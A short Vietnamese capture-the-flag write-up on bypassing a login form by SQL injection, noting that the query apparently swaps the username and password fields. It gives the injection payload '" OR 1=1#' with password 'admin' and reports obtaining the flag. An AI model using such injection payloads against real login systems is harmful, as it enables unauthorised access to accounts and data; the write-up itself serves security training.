# Đề bài: 

# Cách làm:

- Ở lần đầu tiên khi bypass đc sql thì ta sẽ có thông báo với tài khoản là lagon ?, do đó có thể cái username admin kia là password của tài khoản lagon

=> username sẽ là password còn password là username trong câu lệnh truy vấn sql

### Payload:

- Username: " OR 1=1#
- Password: admin

![Screenshot 2024-10-05 091239](https://github.com/user-attachments/assets/c946f423-667e-4c1f-9ab0-25fbdeb060d3)

- Và ta có flag
